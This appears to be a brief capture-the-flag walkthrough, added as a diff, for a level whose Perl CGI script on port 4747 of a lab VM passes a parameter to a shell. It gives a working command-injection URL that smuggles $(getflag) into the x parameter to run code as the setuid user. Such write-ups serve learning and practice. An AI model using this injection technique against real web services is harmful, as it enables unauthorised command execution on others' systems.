@@ -1,0 +1,18 @@
+The vm is a webserver accessible on port 4747:
+
+The command netstat -tulpn | grep LISTEN
+gives us:
+tcp6       0      0 :::4747      :::*     LISTEN  
+
+
+If we cat the level04.pl file, we see that it uses CGI,
+it handles GET/POST request and save an x variable
+
+We can make a GET request given to x the value x=$(getflag)
+
+
+http://172.16.254.130:4747/level04.pl?x=$(getflag)
+
+the script will be executed with the setuid flag04 thus wil return the flag
+
+Get the token: see flag file
